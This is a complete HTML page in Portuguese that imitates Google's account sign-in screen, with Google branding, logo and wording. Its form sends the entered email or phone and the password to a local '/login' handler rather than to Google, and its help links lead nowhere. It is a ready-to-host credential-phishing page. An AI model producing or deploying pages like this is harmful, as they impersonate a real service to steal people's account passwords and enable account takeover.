<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Google</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      border-radius: 8px;
      padding: 40px 30px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .login-container img {
      width: 100px;
      margin-bottom: 20px;
    }
    .login-container h1 {
      font-size: 1.5rem;
      color: #202124;
      margin-bottom: 10px;
    }
    .login-container p {
      font-size: 0.875rem;
      color: #5f6368;
      margin-bottom: 30px;
    }
    .login-container input {
      width: 100%;
      height: 50px;
      margin-bottom: 20px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      padding: 0 10px;
      font-size: 1rem;
    }
    .login-container input:focus {
      border-color: #1a73e8;
      outline: none;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .login-container .login-btn {
      width: 100%;
      height: 50px;
      background-color: #1a73e8;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .login-container .login-btn:hover {
      background-color: #185abc;
    }
    .login-container a {
      display: block;
      color: #1a73e8;
      font-size: 0.875rem;
      margin-top: 20px;
      text-decoration: none;
    }
    .login-container a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="Logo-Google.png" alt="Google Logo">
    <h1>Faça login no Google</h1>
    <p>Use sua Conta do Google</p>
    <form action="/login" method="POST">
      <input type="email" name="username" placeholder="Email ou telefone" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit" class="login-btn">Próxima</button>
    </form>
    <a href="#">Esqueceu seu email?</a>
    <a href="#">Criar conta</a>
  </div>
</body>
</html>
